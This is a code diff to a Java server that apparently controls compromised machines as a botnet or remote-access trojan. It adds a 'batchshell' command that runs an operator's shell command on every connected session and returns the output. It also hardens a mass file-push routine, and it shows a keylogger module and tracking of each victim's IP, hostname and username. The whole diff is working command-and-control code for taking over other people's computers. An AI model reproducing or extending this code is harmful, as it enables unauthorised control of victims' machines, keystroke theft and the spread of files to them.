@@ -104,6 +104,42 @@ public class Server implements Runnable {
                         System.out.println("session might be offline!");
                     }
                 }
+                if (command.equals("batchshell")) {
+                    System.out.println("what command would you like to execute");
+                    System.out.print("command:");
+                    String bscmd = Keyboard.readString();
+                    for(int i=0;i<sessions.size();i++) {
+                        try {
+                            System.out.println("Sending command to " + sessions.get(i).getInetAddress() + " - " + hostnames.get(i));
+                            s = sessions.get(i);
+                            ps = new PrintStream(s.getOutputStream());
+                            os = s.getOutputStream();
+                            din = new BufferedReader(new InputStreamReader(s.getInputStream()));
+                            /*ps.println("a");
+                            String chk = din.readLine();
+                            if (!chk.equals("a")) {
+                                System.out.println("DATA COMMUNICATION ERROR - SESSION MIGHT BE OUT OF SYNC");
+                                continue;
+                            }*/
+                            ps.println("sh99");
+                            ps.println(bscmd);
+                            System.out.println("command sent");
+                            String line = din.readLine();
+                            while (!line.equals("{}{}{}")) {
+                                System.out.println(line);
+                                line = din.readLine();
+                            }
+                            ps.println("sh-99");
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                        }
+                        try {
+                            Thread.sleep(100);
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                        }
+                    }
+                }
                 if (command.equals("keylogger")) {
                     System.out.println("keylogging module initiated");
                     System.out.println("Select Option:");
@@ -238,38 +274,42 @@ public class Server implements Runnable {
                         System.out.println("Syntax is: [local file location] <destination file location>");
                     } else {
                         for(int i=0;i<sessions.size();i++) {
-                            System.out.println("Sending file to " + sessions.get(i).getInetAddress() + " - " + hostnames.get(i));
-                            s = sessions.get(i);
-                            ps = new PrintStream(s.getOutputStream());
-                            os = s.getOutputStream();
-                            din = new BufferedReader(new InputStreamReader(s.getInputStream()));
-                            ps.println("a");
-                            String chk = din.readLine();
-                            if (!chk.equals("a")) {
-                                System.out.println("DATA COMMUNICATION ERROR - SESSION MIGHT BE OUT OF SYNC");
-                                continue;
-                            }
-                            ps.println(uplestr);
-                            if (locDestTmp.length == 1) {
-                                locDest[1] = "de " + locDest[0].substring(locDest[0].lastIndexOf("\\") + 1);
-                            } else {
-                                locDest[1] = locDestTmp[1];
-                            }
-                            //System.out.println(locDest[1]);
-                            ps.println(locDest[1]);
-                            String ret = din.readLine();
-                            if (ret.equals("fe")) {
-                                System.out.println("File destination does not exist");
-                            }
-                            byte[] fileBytes = new byte[(int) fileToUpload.length()];
-                            BufferedInputStream bin = new BufferedInputStream(new FileInputStream(fileToUpload));
-                            bin.read(fileBytes);
-                            System.out.println("sending file " + locDest[0] + " to " + locDest[1]);
-                            os.write(fileBytes);
-                            os.flush();
-                            System.out.println("finished file transfer");
                             try {
-                                Thread.sleep(100);
+                                System.out.println("Sending file to " + sessions.get(i).getInetAddress() + " - " + hostnames.get(i));
+                                s = sessions.get(i);
+                                ps = new PrintStream(s.getOutputStream());
+                                os = s.getOutputStream();
+                                din = new BufferedReader(new InputStreamReader(s.getInputStream()));
+                                ps.println("a");
+                                String chk = din.readLine();
+                                if (!chk.equals("a")) {
+                                    System.out.println("DATA COMMUNICATION ERROR - SESSION MIGHT BE OUT OF SYNC");
+                                    continue;
+                                }
+                                ps.println(uplestr);
+                                if (locDestTmp.length == 1) {
+                                    locDest[1] = "de " + locDest[0].substring(locDest[0].lastIndexOf("\\") + 1);
+                                } else {
+                                    locDest[1] = locDestTmp[1];
+                                }
+                                //System.out.println(locDest[1]);
+                                ps.println(locDest[1]);
+                                String ret = din.readLine();
+                                if (ret.equals("fe")) {
+                                    System.out.println("File destination does not exist");
+                                }
+                                byte[] fileBytes = new byte[(int) fileToUpload.length()];
+                                BufferedInputStream bin = new BufferedInputStream(new FileInputStream(fileToUpload));
+                                bin.read(fileBytes);
+                                System.out.println("sending file " + locDest[0] + " to " + locDest[1]);
+                                os.write(fileBytes);
+                                os.flush();
+                                System.out.println("finished file transfer");
+                                try {
+                                    Thread.sleep(100);
+                                } catch (Exception e) {
+                                    e.printStackTrace();
+                                }
                             } catch (Exception e) {
                                 e.printStackTrace();
                             }
@@ -417,7 +457,7 @@ public class Server implements Runnable {
                                 break;
                             }
                             if (i==sarr.size()-1) {
-                                notconnectedyet=false;
+                                //notconnectedyet=false;
                             }
                         }
                     }
@@ -426,7 +466,7 @@ public class Server implements Runnable {
             if (notconnectedyet) {
                 localIPs.add(tempips);
                 usernames.add(username);
-                lanIPs.add(lanIP);
+                lanIPs.add(lanIP);  
                 hostnames.add(hostname);
                 sessions.add(cs);
                 System.out.print("\nNEW SESSION CONNECTED: IP-" + cs.getInetAddress() + " - " + hostname + " - " + lanIP + " - " + username);
